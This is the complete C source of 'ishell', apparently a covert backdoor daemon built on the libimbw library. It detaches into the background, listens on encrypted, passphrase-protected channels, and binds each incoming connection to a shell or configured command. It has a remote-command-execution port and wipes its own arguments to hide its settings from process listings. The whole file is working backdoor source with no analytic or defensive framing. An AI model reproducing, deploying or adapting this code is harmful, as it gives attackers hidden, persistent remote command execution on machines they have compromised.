#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdarg.h>
#include <stdio.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <imbw.h>
#include "ishell.h"


#define SAFE_FREE(x) do{ if(x) { free(x); x = NULL; } }while(0)
#define MAX(x,y) (x > y ? x : y)
#define VERSION "0.3"
#define MYDAEMON do { if (fork()) exit(0); setsid(); chdir_ishell_dir(argv[0]); } while(0)
#define PIDFILE "ishell.pid"


void            fatal(char *pattern, ...);
void            shellme(int i);
void            die();
void            init_opt(int argc, char **argv);
void            help();
int             filexists(char *pathname);
void            chdir_ishell_dir(char *pathname);
void            pidfile();	/* main_thread_pid > PIDFILE */


int             w_opt = 0;
u_char         *passphrase;
u_int32_t       passphrase_len;


int
main(int argc, char **argv)
{
    int             mx;
    fd_set          rxset;
    int             z,
                    i;

    if (argc == 1)
	help();

    init_opt(argc, argv);

#ifdef DEBUG
    IMBW_DEBUG("CMDS:");
    for (i = 0; CMDS[i].port != -1; ++i) {
	IMBW_DEBUG("%2d: %s (%d)", i, CMDS[i].argv[0], CMDS[i].port);
	for (z = 0; CMDS[i].argv[z]; ++z)
	    IMBW_DEBUG("      %2d# %s", z, CMDS[i].argv[z]);
    }

    for (i = 0; CMDS[i].port != -1; ++i)
	if (!filexists(CMDS[i].argv[0]))
	    IMBW_DEBUG("warning: %s doesn't exists", CMDS[i].argv[0]);
#endif

    MYDAEMON;

    pidfile();
    sleep(w_opt);

    if (imbw_init() < 0)
	fatal("imbw_init(): %s", imbw_errors_buf);

    signal(SIGCHLD, SIG_IGN);

    for (i = 0; CMDS[i].port != -1; ++i)
	if ((CMDS[i].fd =
	     imbw_listen(CMDS[i].port, passphrase, passphrase_len)) < 0)
	    fatal("imbw_listen(%d): %s", CMDS[i].port, imbw_errors_buf);

    IMBW_DEBUG("listening..");


    for (;;) {

	FD_ZERO(&rxset);

	mx = 0;

	for (i = 0; CMDS[i].port != -1; ++i) {
	    FD_SET(CMDS[i].fd, &rxset);
	    mx = MAX(mx, CMDS[i].fd);
	}

	if (select(mx + 1, &rxset, NULL, NULL, NULL) == -1)
	    fatal("select()");

	if (imbw_check_errors())
	    fatal("imbw_check_errors(): %s", imbw_errors_buf);

	for (i = 0; CMDS[i].port != -1; ++i)
	    if (FD_ISSET(CMDS[i].fd, &rxset)) {

		IMBW_DEBUG("incoming connection (?)");
		z = imbw_accept(CMDS[i].fd);

		switch (z) {

		case -1:
		    if ((CMDS[i].fd =
			 imbw_listen(CMDS[i].port, passphrase,
				     passphrase_len)) < 0)
			fatal("imbw_listen(%d): %s", CMDS[i].port,
			      imbw_errors_buf);
		    break;

		case -2:
		    fatal("imbw fatal error: %s", imbw_errors_buf);
		    break;

		default:
		    shellme(i);
		    if ((CMDS[i].fd =
			 imbw_listen(CMDS[i].port, passphrase,
				     passphrase_len)) < 0)
			fatal("imbw_listen(%d): %s", CMDS[i].port,
			      imbw_errors_buf);
		    break;
		}
	    }
    }

    return 0;
}


void
shellme(int i)
{
    int             pid;
    char            rcmd[128],
                   *p;


    IMBW_DEBUG("shell! fd=%d port=%d", CMDS[i].fd, CMDS[i].port);

    if ((pid = fork()) == -1)
	fatal("fork()");
    else if (pid == 0) {

	/*
	 * child
	 */

	/*
	 * la sigmask viene ereditata dallo thread "main", precisamente nella
	 * funzione imbw_init() viene chiamata la macro IMBW_SIGSET_BLOCK. la
	 * funzione pthread_sigmask() fa in qualche modo ereditare la sigmask
	 * creando dei problemi, per questa ragione viene chiamata la macro
	 * IMBW_SIGSET_UNBLOCK. Se sai perche, xenion<at>antifork.org thx :)
	 */

	IMBW_SIGSET_UNBLOCK;

	/*
	 * occorre chiudere i file descriptors non utilizzati 
	 */
	imbw_close_fds_expect012(CMDS[i].fd);	/* thx awgn */

	dup2(CMDS[i].fd, 0);
	dup2(CMDS[i].fd, 1);
	dup2(CMDS[i].fd, 2);

	if (CMDS[i].port == RCMD_PORT) {
	    CMDS[i].argv[2] = rcmd;
	    if (fgets(rcmd, sizeof rcmd, stdin)) {
		for (p = rcmd; *p != '\n' && *p != '\r'; ++p);
		*p++ = ';';
		*p = '\0';
	    } else
		*rcmd = '\0';
	}

	execvp(CMDS[i].argv[0], CMDS[i].argv);


	close(CMDS[i].fd);
	exit(0);
    }

    /*
     * parent
     */

    close(CMDS[i].fd);
}


void
fatal(char *pattern, ...)
{
    va_list         ap;

    va_start(ap, pattern);
    printf("\n");
    vprintf(pattern, ap);
    printf("; exit forced.\n\n");
    va_end(ap);
    die();
}


void
die()
{
    imbw_destroy();
    exit(0);
}


int
filexists(char *pathname)
{
    struct stat     buf;

    return stat(pathname, &buf) == -1 ? 0 : 1;
}


void
init_opt(int argc, char **argv)
{
    int             c;

    passphrase = NULL;
    passphrase_len = 0;

    while ((c = getopt(argc, argv, "i:S:p:0:1:2:l:G:a:b:Lw:hV")) != EOF)
	switch (c) {

	case 'i':
	    imbw_opt.dev = strdup(optarg);
	    break;

	case 'S':
	    imbw_opt.sign = strdup(optarg);
	    break;

	case 'p':
	    passphrase = strdup(optarg);
	    passphrase_len = strlen(optarg);
	    break;

	case '0':
	    imbw_opt.packet_attempts = atoi(optarg);
	    break;

	case '1':
	    imbw_opt.packet_timeout = atoi(optarg);
	    break;

	case '2':
	    imbw_opt.keepalive_timeout = atoi(optarg);
	    break;

	case 'l':
	    imbw_opt.pmsize = atoi(optarg);
	    break;

	case 'G':
	    sscanf(optarg, "%d:%d",
		   &imbw_opt.plugin_send, &imbw_opt.plugin_recv);
	    break;

	case 'a':
	    imbw_opt.plugin_send_options = strdup(optarg);
	    break;

	case 'b':
	    imbw_opt.plugin_recv_options = strdup(optarg);
	    break;

	case 'w':
	    w_opt = atoi(optarg);
	    break;

	case 'L':
	    {
		int             i,
		                j;
		printf("remote-cmd-exec port: %2d\n\n", RCMD_PORT);

		for (i = 0; CMDS[i].port != -1; ++i) {
		    if (CMDS[i].port == RCMD_PORT)
			continue;
		    // printf("%2d:%3d: %s\n", i, CMDS[i].port,
		    // CMDS[i].argv[0]);
		    printf("%2d:\n", CMDS[i].port);
		    for (j = 0; CMDS[i].argv[j]; ++j)
			printf("      %2d# %s\n", j, CMDS[i].argv[j]);
		}
	    }
	    printf("\n");
	    die();

	case 'V':
	    printf("ishell v%s, using libimbw v%s\n", VERSION,
		   LIBIMBW_VER);
	    die();
	    break;

	case 'h':
	    help();
	    die();
	    break;

	default:
	    fatal("try -h");
	}

    for (c = 1; c < argc; ++c)
	memset(argv[c], '\0', strlen(argv[c]));
}


void
help()
{
    int             i;

    printf("Usage: ishell [OPTIONS]\n\n");
    printf("MISC\n");
    printf("  -w seconds      sleep n seconds on startup\n");
    printf("  -L              view CMDS[]\n\n");
    printf("IMBW\n");
    printf("  -i iface        listen on this network interface\n");
    printf
	("  -S mysign       only signed packets will be processed (optimization)\n");
    printf("  -p passphrase   passphrase, used for encryption\n");
    printf
	("  -0 n            resend packet n times before closing connection (%d)\n",
	 imbw_opt.packet_attempts);
    printf("  -1 t            packet timeout (%d)\n",
	   imbw_opt.packet_timeout);
    printf
	("  -2 t            inactivity timeout for keepalive packets (%d)\n",
	 imbw_opt.keepalive_timeout);
    printf("  -l length       maximum payload length (%d)\n",
	   imbw_opt.pmsize);
    printf
	("  -G S:R          load those two plugins. List of available plugins:\n\n");
    printf("                  ID TYPE DESCRIPTION\n\n");

    for (i = 0; imbw_plugins[i].descr; ++i)
	printf("                  %.2d %s %s\n", i,
	       imbw_plugins[i].send ? "send" : "recv",
	       *imbw_plugins[i].descr);
    printf("\n  -a opt          options for the 'SEND' type plugin\n");
    printf("  -b opt          options for the 'RECV' type plugin\n\n");

    die();
}

void
chdir_ishell_dir(char *pathname)
{
    char           *p;

    if ((p = strrchr(pathname, '/'))) {
	*p = '\0';
	chdir(pathname);
	*p = '/';
    }
}


void
pidfile()
{
    FILE           *f;


    if ((f = fopen(PIDFILE, "w")) == NULL)
	fatal("unable to open '%s'", PIDFILE);
    fprintf(f, "%u\n", getpid());
    fclose(f);

}
